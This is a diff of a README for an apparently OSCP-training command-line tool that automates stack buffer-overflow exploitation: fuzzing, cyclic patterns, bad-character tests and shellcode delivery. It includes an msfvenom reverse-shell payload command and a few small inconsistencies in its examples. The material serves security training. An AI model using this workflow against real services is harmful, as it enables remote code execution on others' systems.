@@ -1,107 +1,268 @@
 # Overflow
-A command-line tool for exploiting OSCP-like buffer overflows.
+Overflow is a command-line tool you can use to exploit OSCP-like buffer
+overflows.
 
-## 1. Installation
+## Installation
+
+### Pre-Built Binaries
+I'll do this as soon as I make a release.
+
+### Using Go Get
+If you have a golang environment set up, you can use `go get` to fetch and
+install the binary in your `$GOPATH/bin` directory.
+```sh
+$ go get github.com/sradley/overflow
+```
+
+### Building from Source
+If you have a golang environment set up, you can build straight from source.
+
+The following commands will install dependencies and compile a working binary. 
 ```sh
 $ git clone https://github.com/sradley/overflow.git
 $ cd overflow
-$ cabal update
-$ cabal install
+$ go get && go build
 ```
 
-## 2. Usage
-The help menu is pretty exhaustive, if you're stuck you should give it a look.
-
+You can also use `go install` to install the binary in your `$GOPATH/bin`
+directory.
 ```sh
-$ overflow --help
-...
-```
-```sh
-$ overflow <subcommand> --help
-...
+$ git clone https://github.com/sradley/overflow.git
+$ cd overflow
+$ go install
 ```
 
-### 2.1. Fuzzing
-You can use this tool to discover the length of the target buffer.
-
-The fuzz subcommand will send increasingly long (size specified by the step
-parameter) bytestrings comprised of As (0x41). When the server stops responding
-the fuzzer assumes that it has reached a buffer overflow and reports the
-possible length of the buffer.
-
+## Usage
+The help text is pretty exhaustive, so it's a good place to start if you want
+to get a feel for this tool.
 ```
-$ overflow fuzz 127.0.0.1 4444 -S 100
-    ───> Sending 100-byte payload to target...
-    ───> Sending 200-byte payload to target...
-    ───> Sending 300-byte payload to target...
-    ───> Sending 400-byte payload to target...
-    ───> Sending 500-byte payload to target...
-Done! Length of buffer is in the range (400, 500].
+$ overflow help
+$ overflow (fuzz | pattern | chars | exploit) --help
 ```
 
-### 2.2. Sending a Cyclic Pattern
-You can use this tool to send a cyclic pattern of bytes to the server. Great
-for discovering offsets of particular registers.
+The required flags for every subcommand are "host" and "port". You can also
+specify any prefixes or suffixes to put before and after the payload, in the
+case that a menu or something is presented to you when you open the socket.
 
-The pattern subcommand will generate and send a specified length cyclic pattern
-of bytes to the target server, however, figuring out the offset to the EIP
-register (for example) is up to you. 
+### Fuzzing for Buffer Length
+Possibly the most important step in buffer overflow exploitation is finding the
+length of buffer you want to target. An easy way to do this is to send
+increasingly large sequences of bytes to the buffer until it crashes.
 
+The `fuzz` subcommand sends increasingly large sequences of bytes (the increase
+is specifed by the "step" flag) until the service crashes. This tool also
+outputs the possible size of the buffer, in case it wasn't easy enough already. 
+
+#### Usage
+The required flags are "host", "port" and "step".
 ```
-$ overflow pattern 127.0.0.1 4444 -l 80
-    ───> Sending 80-byte cyclic pattern to target.
-Success! Finished sending pattern to target
+$ overflow fuzz (-H|--host HOST) (-P|--port PORT) (-S|--step STEP) [flags]
 ```
 
+#### Example
+Here's a quick example using this subcommand to fuzz for the length of the
+target buffer in 100-byte steps.
+```
+$ overflow fuzz -H 127.0.0.1 -P 4444 -S 100
+
+   ____                  __ _               
+  / __ \                / _| |              
+ | |  | |_   _____ _ __| |_| | _____      __
+ | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
+ | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
+  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
+  
+ Overflow v0.1
+ by Stephen Radley (github.com/sradley)
+─────────────────────────────────────────────────
+ :: Mode		: fuzz 
+ :: Host		: 127.0.0.1
+ :: Port		: 4444
+ :: Step		: 100
+─────────────────────────────────────────────────
+ > Building payload.
+ > Sending 100-byte payload.
+ > Building payload.
+ > Sending 200-byte payload.
+ > Building payload.
+ > Sending 300-byte payload.
+ > Building payload.
+ > Sending 400-byte payload.
+ > Building payload.
+ > Sending 500-byte payload.
+ 
+ Success! Length of buffer is (400, 500].
+```
+
+### Sending Cyclic Patterns
+Why would you want to do this? Well, sending a cyclic pattern of bytes to the
+target service is a very easy way to figure out the offset of the EIP register.
+Tools like `mona` can automatically determine the offset of particular
+registers if buffer has been overflowed with a cyclic pattern of bytes.
+
+The `pattern` subcommand streamlines the process of generating a cyclic pattern
+of bytes and sending it to the target service. Turning what is normally an
+annoying multi-step process into a single command.
+
+#### Usage
+The required flags are "host", "port" and "length".
+```
+$ overflow pattern (-H|--host HOST) (-P|--port PORT) (-l|--length LENGTH) [flags]
+```
+
+#### Example
+Here's a quick example using this subcommand to send a 60-byte cyclic pattern
+to the target service.
+```
+$ overflow pattern -H 127.0.0.1 -P 4444 -l 65
+
+   ____                  __ _               
+  / __ \                / _| |              
+ | |  | |_   _____ _ __| |_| | _____      __
+ | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
+ | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
+  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
+
+ Overflow v0.1
+ by Stephen Radley (github.com/sradley)
+─────────────────────────────────────────────────
+ :: Mode		: pattern 
+ :: Host		: 127.0.0.1
+ :: Port		: 4444
+ :: Length		: 65
+─────────────────────────────────────────────────
+ > Building payload.
+ > Sending 65-byte payload.
+ 
+ Success! No errors found.
+```
+
+You can see the pattern sent in the `netcat` output below.
 ```
 $ nc -lvp 4444
 Connection from 127.0.0.1:48870
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac
 ```
 
-### 2.3. Finding Bad Characters
-You can use this tool to send every character from 0x00 to 0xFF to the target
-service. It's only real use is to discover bad characters (e.g. characters that
-the service treats differently in execution).
+### Sending (Bad) Characters
+An important part of buffer overflow exploitation is determining which
+characters are "bad", or which characters are treated differently by the target
+service.
 
-The badchars subcommand will generate and send a bytestring consisting of every
-possible character to the target service. However, determining which characters
-are bad is up to you.
+The `chars` subcommand sends every character from 0x00 to 0xFF to the target
+service. You can optionally exclude particular characters from the payload sent
+to the target service.
 
+#### Usage
+Required flags are "host", "port" and "offset".
 ```
-$ overflow badchars 127.0.0.1 4444 -o 160
-    ───> Sending characters to target.
-Done! Finished sending characters to target.
-```
-
-You can also exclude particular characters from the payload sent to the target.
-For example, say you wanted to exclude the characters '00', '05' and '1A'.
-
-```
-$ overflow badchars 127.0.0.1 4444 -o 160 -e "00,05,1a"
-    ───> Sending characters to target.
-Done! Finished sending characters to target.
+$ overflow chars (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) [flags]
 ```
 
-### 2.4. Running an Exploit
-Generate a RAW payload using msfvenom, for example.
+#### Example
+Here's an example showing the use of this subcommand. Make sure you include the
+offset to the EIP register.
 ```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 \
-    EXITFUNC=thread -b "\x00" --platform=Windows --arch=x86 -o payload.shell
-Found 11 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-x86/shikata_ga_nai chosen with final size 351
-Payload size: 351 bytes
-Saved as: payload.shell
+$ overflow chars -H 127.0.0.1 -P 4444 -o 160
+
+   ____                  __ _               
+  / __ \                / _| |              
+ | |  | |_   _____ _ __| |_| | _____      __
+ | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
+ | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
+  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
+
+ Overflow v0.1
+ by Stephen Radley (github.com/sradley)
+─────────────────────────────────────────────────
+ :: Mode		: chars 
+ :: Host		: 127.0.0.1
+ :: Port		: 4444
+ :: Offset		: 160
+─────────────────────────────────────────────────
+ > Building payload.
+ > Sending 416-byte payload. 
+ 
+ Success! No errors found.
 ```
 
-Then send the payload using the exploit subcommand. Just add the hex for the
-jump point (-j|--jump) and add the offset to the EIP register (-o|--offset),
-and you're good to go.
+You can also optionally specify characters to exclude from the payload, make
+sure that you use the format in the example below.
 ```
-$ overflow exploit 127.0.0.1 4444 -o 160 -j "5f4a358f" -p path/to/payload.shell
-    ───> Sending exploit payload to target...
-Done! Finished sending exploit to target.
+$ overflow chars -H 127.0.0.1 -P 4444 -o 160 -e "\x00\x41\xAB\x01"
+
+   ____                  __ _               
+  / __ \                / _| |              
+ | |  | |_   _____ _ __| |_| | _____      __
+ | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
+ | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
+  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
+
+ Overflow v0.1
+ by Stephen Radley (github.com/sradley)
+─────────────────────────────────────────────────
+ :: Mode		: chars 
+ :: Host		: 127.0.0.1
+ :: Port		: 4444
+ :: Offset		: 160
+ :: Exclude     : "\x00\x41\xAB\x01"
+─────────────────────────────────────────────────
+ 2020/10/29 20:19:05 Starting overflow
+─────────────────────────────────────────────────
+ > Building payload.
+ > Sending 412-byte payload. 
+ 
+ Success! No errors found.
+```
+
+### Running Exploits
+Once you've found the offset of the EIP register, and a valid jump address, you
+can execute shellcode on the target service. The `exploit` subcommand provides
+an easy way to do so.
+
+#### Usage
+Required parameters are "host", "port", "offset", "jump" and "shell". Where
+shell is the path to your desired payload.
+```
+$ overflow exploit (-H|--host HOST) (-P|--port PORT) (-o|--offset OFFSET) \
+    (-j|--jump JUMP) (-S|--shell SHELL) [flags]
+```
+
+#### Example
+Here's a brief example explaining how you can use the `exploit` subcommand to
+execute a payload generated by `msfvenom`.
+
+Generate a **raw** payload using `msfvenom`, call it whatever you want.
+```
+$ msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4321 \
+    EXITFUNC=thread -b "\x00" -f raw -o payload.shell
+```
+
+Then just use the tool as follows, ensuring you include the offset to the EIP
+register and the jump address in the format used below.
+```
+$ overflow -H 127.0.0.1 4444 -o 160 -j "0x5f4a358f" -S path/to/payload.shell
+
+   ____                  __ _               
+  / __ \                / _| |              
+ | |  | |_   _____ _ __| |_| | _____      __
+ | |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
+ | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
+  \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  
+
+ Overflow v0.1
+ by Stephen Radley (github.com/sradley)
+─────────────────────────────────────────────────
+ :: Mode		: exploit 
+ :: Host		: 127.0.0.1
+ :: Port		: 4444
+ :: Offset		: 160
+ :: Jump		: "0x5f4a358f"
+ :: Shell		: path/to/payload.shell
+─────────────────────────────────────────────────
+ > Building payload.
+ > Sending 531-byte payload. 
+ 
+ Success! No errors found.
 ```
 
